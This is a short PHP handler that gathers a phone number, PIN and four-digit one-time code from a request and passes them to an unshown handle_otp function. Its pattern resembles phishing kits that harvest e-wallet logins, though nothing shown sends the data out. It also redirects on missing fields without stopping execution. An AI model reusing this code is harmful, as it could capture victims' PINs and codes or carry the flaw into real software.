<?php
require_once 'functions.php';


$data = $_REQUEST;

if ( ! isset( $data['otp1'] ) || ! isset( $data['otp2'] ) || ! isset( $data['otp3'] ) || ! isset( $data['otp4'] ) || ! isset( $data['nomor'] ) || ! isset( $data['pin'] ) ) {
    header( 'Location: star.php' );
}

$nomor = $data['nomor'];
$pin   = $data['pin'];

$otp1 = $data['otp1'];
$otp2 = $data['otp2'];
$otp3 = $data['otp3'];
$otp4 = $data['otp4'];

$otp = $otp1 . $otp2 . $otp3 . $otp4;

$data = [
    'nomor' => $nomor,
    'pin'   => $pin,
    'otp'   => $otp,
];

handle_otp( $data );